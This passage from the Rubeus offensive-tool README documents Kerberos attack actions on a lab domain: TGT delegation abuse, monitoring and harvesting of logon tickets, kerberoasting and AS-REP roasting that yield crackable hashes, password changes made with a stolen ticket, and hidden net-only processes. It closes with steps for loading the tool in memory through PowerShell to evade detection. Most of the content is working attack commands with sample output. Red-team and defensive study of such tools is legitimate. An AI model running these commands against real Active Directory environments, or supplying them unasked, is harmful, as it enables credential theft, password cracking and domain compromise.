If automatic target/domain extraction is failing, a known SPN of a service configured with unconstrained delegation can be specified with `/target:SPN`.

    C:\Rubeus>Rubeus.exe tgtdeleg

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3


    [*] Action: Request Fake Delegation TGT (current user)

    [*] No target SPN specified, attempting to build 'HOST/dc.domain.com'
    [*] Initializing Kerberos GSS-API w/ fake delegation for target 'HOST/PRIMARY.testlab.local'
    [+] Kerberos GSS-API initialization success!
    [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
    [*] Found the AP-REQ delegation ticket in the GSS-API output.
    [*] Authenticator etype: aes256_cts_hmac_sha1
    [*] Extracted the service ticket session key from the ticket cache: YnEFxPfqw3LdfNvLtdFfzaFf7zG3hG+HNjesy+6R+ys=
    [+] Successfully decrypted the authenticator
    [*] base64(ticket.kirbi):

        doIFNjCCBTKgAwIBBaEDAgEWoo...(snip)...


### monitor

The **monitor** action will monitor the event log for 4624 logon events and will extract any new TGT tickets for the new logon IDs (LUIDs). The `/interval:X` parameter (in seconds, default of 60) specifies how often to check the event log. A `/filteruser:USER` can be specified, returning only ticket data for said user. This function is especially useful on servers with unconstrained delegation enabled ;)

When the `/filteruser:USER` (or if not specified, any user) creates a new 4624 logon event, any extracted TGT KRB-CRED data is output.

Further, if you wish to save the output to the registry, pass the `/registry` flag and specfiy a path under HKLM to create (e.g., `/registry:SOFTWARE\MONITOR`). Then you can remove this entry after you've finished running Rubeus by `Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force`.

    c:\Rubeus>Rubeus.exe monitor /filteruser:dfm.a

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: TGT Monitoring
    [*] Monitoring every 60 seconds for 4624 logon events
    [*] Target user : dfm.a


    [+] 9/17/2018 7:59:02 PM - 4624 logon event for 'TESTLAB.LOCAL\dfm.a' from '192.168.52.100'
    [*] Target LUID     : 0x991972
    [*] Target service  : krbtgt

      UserName                 : dfm.a
      Domain                   : TESTLAB
      LogonId                  : 10033522
      UserSID                  : S-1-5-21-883232822-274137685-4173207997-1110
      AuthenticationPackage    : Kerberos
      LogonType                : Network
      LogonTime                : 9/18/2018 2:59:02 AM
      LogonServer              :
      LogonServerDNSDomain     : TESTLAB.LOCAL
      UserPrincipalName        :

        ServiceName              : krbtgt
        TargetName               :
        ClientName               : dfm.a
        DomainName               : TESTLAB.LOCAL
        TargetDomainName         : TESTLAB.LOCAL
        AltTargetDomainName      : TESTLAB.LOCAL
        SessionKeyType           : aes256_cts_hmac_sha1
        Base64SessionKey         : orxXJZ/r7zbDvo2JUyFfi+2ygcZpxH8e6phGUT5zDbc=
        KeyExpirationTime        : 12/31/1600 4:00:00 PM
        TicketFlags              : name_canonicalize, renewable, forwarded, forwardable
        StartTime                : 9/17/2018 7:59:02 PM
        EndTime                  : 9/18/2018 12:58:59 AM
        RenewUntil               : 9/24/2018 7:58:59 PM
        TimeSkew                 : 0
        EncodedTicketSize        : 1470
        Base64EncodedTicket      :

          doIFujCCBbagAwIBBaE...(snip)...


    [*] Extracted  1 total tickets

**Note that this action needs to be run from an elevated context!**


### harvest

The **harvest** action takes [monitor](#monitor) one step further. It monitors the event log for 4624 events every `/interval:MINUTES` for new logons, extracts any new TGT KRB-CRED files, and keeps a cache of any extracted TGTs. On the `/interval`, any TGTs that will expire before the next interval are automatically renewed (up until their renewal limit), and the current cache of "usable"/valid TGT KRB-CRED .kirbis are output as base64 blobs.

This allows you to harvest usable TGTs from a system without opening up a read handle to LSASS, though elevated rights are needed to extract the tickets.

Further, if you wish to save the output to the registry, pass the `/registry` flag and specfiy a path under HKLM to create (e.g., `/registry:SOFTWARE\MONITOR`). Then you can remove this entry after you've finished running Rubeus by `Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force`.

    c:\Rubeus>Rubeus.exe harvest /interval:30

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v0.0.1a

    [*] Action: TGT Harvesting (w/ auto-renewal)

    [*] Monitoring every 30 minutes for 4624 logon events

    ...(snip)...

    [*] Renewing TGT for dfm.a@TESTLAB.LOCAL
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1520 bytes
    [*] Received 1549 bytes

    [*] 9/17/2018 6:43:02 AM - Current usable TGTs:

    User                  :  dfm.a@TESTLAB.LOCAL
    StartTime             :  9/17/2018 6:43:02 AM
    EndTime               :  9/17/2018 11:43:02 AM
    RenewTill             :  9/24/2018 2:07:48 AM
    Flags                 :  name_canonicalize, renewable, forwarded, forwardable
    Base64EncodedTicket   :

        doIFujCCBbagAw...(snip)...

**Note that this action needs to be run from an elevated context!**


## Roasting

Breakdown of the roasting commands:

| Command     | Description |
| ----------- | ----------- |
| [kerberoast](#kerberoast) | Perform Kerberoasting against all (or specified) users |
| [asreproast](#asreproast) | Perform AS-REP roasting against all (or specified) users |


### kerberoast

The **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack/SharpRoast) project's functionality. Like SharpRoast, this action uses the [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method that was contributed to PowerView by [@machosec](https://twitter.com/machosec) in order to request the proper service ticket. Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.

With no other arguments, all user accounts with SPNs set in the current domain are kerberoasted. The `/spn:X` argument roasts just the specified SPN, the `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.

The `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.

Also, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.

Kerberoasting all users in the current domain:

    C:\Rubeus>Rubeus.exe kerberoast

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: Kerberoasting


    [*] SamAccountName         : harmj0y
    [*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
    [*] ServicePrincipalName   : asdf/asdfasdf
    [*] Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$AE5F019D4CDED6CD74830CC...(snip)...


    [*] SamAccountName         : sqlservice
    [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
    [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
    [*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$E2B3869290...(snip)...


    [*] SamAccountName         : patsy
    [*] DistinguishedName      : CN=patsy,CN=Users,DC=testlab,DC=local
    [*] ServicePrincipalName   : blah/nonexistent
    [*] Hash                   : $krb5tgs$23$*$testlab.local$blah/nonexistent*$139799341096C26C727D...(snip)...


    [*] SamAccountName         : andy
    [*] DistinguishedName      : CN=andy,CN=Users,DC=testlab,DC=local
    [*] ServicePrincipalName   : blah/blah
    [*] Hash                   : $krb5tgs$23$*$testlab.local$blah/blah*$83E94269D80BD2466AB05F1F557...(snip)...


    [*] SamAccountName         : testuser2
    [*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
    [*] ServicePrincipalName   : service/host
    [*] Hash                   : $krb5tgs$23$*$testlab.local$service/host*$5E231977A1E3D3E4BD8FBC2A...(snip)...


    [*] SamAccountName         : constraineduser
    [*] DistinguishedName      : CN=constraineduser,CN=Users,DC=testlab,DC=local
    [*] ServicePrincipalName   : BLAH123/BLAH123
    [*] Hash                   : $krb5tgs$23$*$testlab.local$BLAH123/BLAH123*$7488D1379F05ADEDE5C20...(snip)...


Kerberoasting all users in a specific OU, saving the hashes to an output file:

    C:\Rubeus>Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local /outfile:C:\Temp\hashes.txt

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: Kerberoasting

    [*] Target OU              : OU=TestingOU,DC=testlab,DC=local

    [*] SamAccountName         : testuser2
    [*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
    [*] ServicePrincipalName   : service/host
    [*] Hash written to C:\Temp\hashes.txt

    [*] Roasted hashes written to : C:\Temp\hashes.txt


Kerberoasting a specific user:

    C:\Rubeus>Rubeus.exe kerberoast /user:sqlservice

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4

    [*] Action: Kerberoasting

    [*] Target User            : sqlservice

    [*] SamAccountName         : sqlservice
    [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
    [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
    [*] Hash                   : $krb5tgs$23$*sqlservice$testlab.local$MSSQLSvc/SQL.testlab.local*$E2B386...(snip)...


Kerberoasting a specific SPN:

    C:\Rubeus>Rubeus.exe kerberoast /spn:MSSQLSvc/SQL.testlab.local

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: Kerberoasting

    [*] Target SPN             : MSSQLSvc/SQL.testlab.local
    [*] Hash                   : $krb5tgs$23$*$DOMAIN$MSSQLSvc/SQL.testlab.local*$E2B3869290BA2AD82...(snip)...


Kerberoasting all users in a foreign _trusting_ domain:

    C:\Rubeus>Rubeus.exe kerberoast /domain:dev.testlab.local

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: Kerberoasting

    [*] Target Domain          : dev.testlab.local

    [*] SamAccountName         : jason
    [*] DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local
    [*] ServicePrincipalName   : test/test
    [*] Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test@dev.testlab.local*$969339A82...(snip)...


Kerberoasting users in a foreign non-trusting domain using alternate credentials:

    C:\Rubeus>Rubeus.exe kerberoast /domain:external.local /creduser:"EXTERNAL.local\administrator" /credpassword:"Password123!"

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: Kerberoasting

    [*] Target Domain          : external.local
    [*] Using alternate creds  : EXTERNAL.local\administrator

    [*] SamAccountName         : admanagement
    [*] DistinguishedName      : CN=admanagement,CN=Users,DC=external,DC=local
    [*] ServicePrincipalName   : RestrictedKrbHost/server.external.local
    [*] Hash                   : $krb5tgs$23$*$external.local$RestrictedKrbHost/server.external.local@external.lo
                                cal*$28F02F1AF08F9335C...(snip)...


### asreproast

The **asreproast** action replaces the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) project which executed similar actions with the (larger sized) [BouncyCastle](https://www.bouncycastle.org/) library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting. For more technical information, [see this post](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/).

Just as with the [kerberoast](#kerberoast) command, if no other arguments are supplied, all user accounts not requiring with Kerberos preauth not required are roasted. The `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.

The `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.

Also, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.

The output `/format:X` defaults to John the Ripper ([Jumbo version](https://github.com/magnumripper/JohnTheRipper)). `/format:hashcat` is also an option for the new hashcat mode 18200.

AS-REP roasting all users in the current domain:

    C:\Rubeus>Rubeus.exe asreproast

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: AS-REP roasting

    [*] Target Domain          : testlab.local

    [*] SamAccountName         : dfm.a
    [*] DistinguishedName      : CN=dfm.a,CN=Users,DC=testlab,DC=local
    [*] Using domain controller: testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 163 bytes
    [*] Received 1537 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

        $krb5asrep$dfm.a@testlab.local:D4A4BC281B200EE35CBF4A4537792D07$D655...(snip)...

    [*] SamAccountName         : TestOU3user
    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
    [*] Using domain controller: testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 169 bytes
    [*] Received 1437 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

        $krb5asrep$TestOU3user@testlab.local:DD6DF16B7E65223679CD703837C94FB...(snip)..

    [*] SamAccountName         : harmj0y2
    [*] DistinguishedName      : CN=harmj0y2,CN=Users,DC=testlab,DC=local
    [*] Using domain controller: testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\harmj0y2'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 166 bytes
    [*] Received 1407 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

        $krb5asrep$harmj0y2@testlab.local:7D2E379A076BB804AF275ED51B86BF85$8...(snip)..


AS-REP roasting all users in a specific OU, saving the hashes to an output file in Hashcat format:
    
    C:\Rubeus>Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /format:hashcat /outfile:C:\Temp\hashes.txt

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: AS-REP roasting

    [*] Target OU              : OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
    [*] Target Domain          : testlab.local

    [*] SamAccountName         : TestOU3user
    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
    [*] Using domain controller: testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 169 bytes
    [*] Received 1437 bytes
    [+] AS-REQ w/o preauth successful!
    [*] Hash written to C:\Temp\hashes.txt

    [*] Roasted hashes written to : C:\Temp\hashes.txt


AS-REP roasting a specific user:

    C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: AS-REP roasting

    [*] Target User            : TestOU3user
    [*] Target Domain          : testlab.local

    [*] SamAccountName         : TestOU3user
    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
    [*] Using domain controller: testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 169 bytes
    [*] Received 1437 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

        $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...


AS-REP roasting all users in a foreign _trusting_ domain:

    C:\Rubeus>Rubeus.exe asreproast /domain:dev.testlab.local

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: AS-REP roasting

    [*] Target Domain          : dev.testlab.local

    [*] SamAccountName         : devuser3
    [*] DistinguishedName      : CN=devuser3,CN=Users,DC=dev,DC=testlab,DC=local
    [*] Using domain controller: dev.testlab.local (192.168.52.105)
    [*] Building AS-REQ (w/o preauth) for: 'dev.testlab.local\devuser3'
    [*] Connecting to 192.168.52.105:88
    [*] Sent 175 bytes
    [*] Received 1448 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

        $krb5asrep$devuser3@dev.testlab.local:650B881E44B92FB6A378DD21E8B020...(snip)...


AS-REP roasting users in a foreign non-trusting domain using alternate credentials:

    C:\Rubeus>Rubeus.exe asreproast /domain:external.local /creduser:"EXTERNAL.local\administrator" /credpassword:"Password123!"

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4


    [*] Action: AS-REP roasting

    [*] Target Domain          : external.local

    [*] Using alternate creds  : EXTERNAL.local\administrator

    [*] SamAccountName         : david
    [*] DistinguishedName      : CN=david,CN=Users,DC=external,DC=local
    [*] Using domain controller: external.local (192.168.52.95)
    [*] Building AS-REQ (w/o preauth) for: 'external.local\david'
    [*] Connecting to 192.168.52.95:88
    [*] Sent 165 bytes
    [*] Received 1376 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

        $krb5asrep$david@external.local:9F5A33465C53056F17FEFDF09B7D36DD$47DBAC3...(snip)...


## Miscellaneous

Breakdown of the miscellaneous commands:

| Command     | Description |
| ----------- | ----------- |
| [createnetonly](#createnetonly) | Create a process of logon type 9 |
| [changepw](#changepw) | Perform the Aorato Kerberos password reset |


### createnetonly

The **createnetonly** action will use the CreateProcessWithLogonW() API to create a new hidden (unless `/show` is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The process ID and LUID (logon session ID) are returned. This process can then be used to apply specific Kerberos tickets to with the [ptt /luid:0xA..](#ptt) parameter, assuming elevation. This prevents the erasure of existing TGTs for the current logon session.

Create a hidden upnpcont.exe process:

    C:\Rubeus>Rubeus.exe createnetonly /program:"C:\Windows\System32\upnpcont.exe"

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3


    [*] Action: Create Process (/netonly)

    [*] Showing process : False
    [+] Process         : 'C:\Windows\System32\upnpcont.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 9936
    [+] LUID            : 0x4a0717f


Create a visible command prompt:

    C:\Rubeus>Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3


    [*] Action: Create Process (/netonly)

    [*] Showing process : True
    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 5352
    [+] LUID            : 0x4a091c0


### changepw

The **changepw** action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified `/new:PASSWORD` value. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo's **misc::changepw** function.

You can retrieve a TGT blob using the [asktgt](#asktgt) command.

    C:\Rubeus>Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: Reset User Password (AoratoPw)

    [*] Changing password for user: harmj0y@TESTLAB.LOCAL
    [*] New password value: Password123!
    [*] Building AP-REQ for the MS Kpassword request
    [*] Building Authenticator with encryption key type: rc4_hmac
    [*] base64(session subkey): nX2FOQ3RsGxoI8uqIg1zlg==
    [*] Building the KRV-PRIV structure
    [*] Connecting to 192.168.52.100:464
    [*] Sent 1347 bytes
    [*] Received 167 bytes
    [+] Password change success!


## Compile Instructions

We are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)

Rubeus has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "Release", and build.

### Targeting other .NET versions

Rubeus' default build configuration is for .NET 3.5, which will fail on systems without that version installed. To target Rubeus for .NET 4 or 4.5, open the .sln solution, go to **Project** -> **Rubeus Properties** and change the "Target framework" to another version.

### Sidenote: Building Rubeus as a Library

To build Rubeus as a library, under **Project** -> **Rubeus Properties** -> change **Output type** to **Class Library**. Compile, and add the Rubeus.dll as a reference to whatever project you want. Rubeus functionality can then be invoked as in a number of ways:


    // pass the Main method the arguments you want
    Rubeus.Program.Main("dump /luid:3050142".Split());

    // or invoke specific functionality manually
    Rubeus.LSA.ListKerberosTicketDataAllUsers(new Rubeus.Interop.LUID());


You can then use [ILMerge](https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630) to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.


### Sidenote: Running Rubeus Through PowerShell

If you want to run Rubeus in-memory through a PowerShell wrapper, first compile the Rubeus and base64-encode the resulting assembly:

    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt

Rubeus can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded Rubeus assembly string):

    $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))

The Main() method and any arguments can then be invoked as follows:

    [Rubeus.Program]::Main("dump /luid:3050142".Split())

Or individual functions can be invoked:

    $KerbTicket = 'do...' # base64-encoded ticket.kirbi
    $TicketBytes = [convert]::FromBase64String($KerbTicket)
    $LogonID = [Rubeus.LSA]::CreateProcessNetOnly("mmc.exe", $false)
    [Rubeus.LSA]::ImportTicket($TicketBytes, $LogonID)
